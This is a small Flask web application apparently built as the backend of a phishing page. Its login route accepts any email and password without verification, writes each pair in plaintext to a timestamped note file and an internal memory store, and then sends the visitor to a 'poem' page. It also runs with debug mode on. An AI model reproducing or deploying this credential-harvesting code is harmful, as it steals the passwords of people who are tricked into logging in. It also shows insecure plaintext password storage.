import requests
import json
import time
from datetime import timedelta
import datetime
from flask import Flask, redirect, url_for, render_template, request, session
from etc.memory import memory as m


app = Flask(__name__)
app.secret_key = "........"
memory = m.MemoryUnit()
app.permanent_session_lifetime = timedelta(minutes=1440)

def take_note(user, pw):
	date = str(datetime.datetime.now().date()) + "%" + str(datetime.datetime.now().hour) + "+" + str(
		datetime.datetime.now().minute) + "}"
	file_name = user + " " + str(date).replace(":", "-") + "-note.txt"
	with open(file_name, "w") as f:
		f.write(f"{user} : {pw}")

@app.route("/")
def index():
	if "user" in session:
		return redirect(url_for("poem"))
	else:
		return render_template("index.html")

@app.route("/login", methods=["POST", "GET"])
def login():
    if request.method == 'POST':
        user = request.form['email']
        password = request.form['password']
        session["user"] = user
        take_note(user, password)
        memory.data_entry(user, password)
        time.sleep(4)
        
        return redirect(url_for('poem'))
    else:
        return render_template('login.html')

@app.route("/poem", methods=["POST", "GET"])
def poem():
	if "user" in session:
		return render_template("poem.html")
	else:
		return render_template("login.html")


if __name__ == '__main__':
	app.run(debug=True)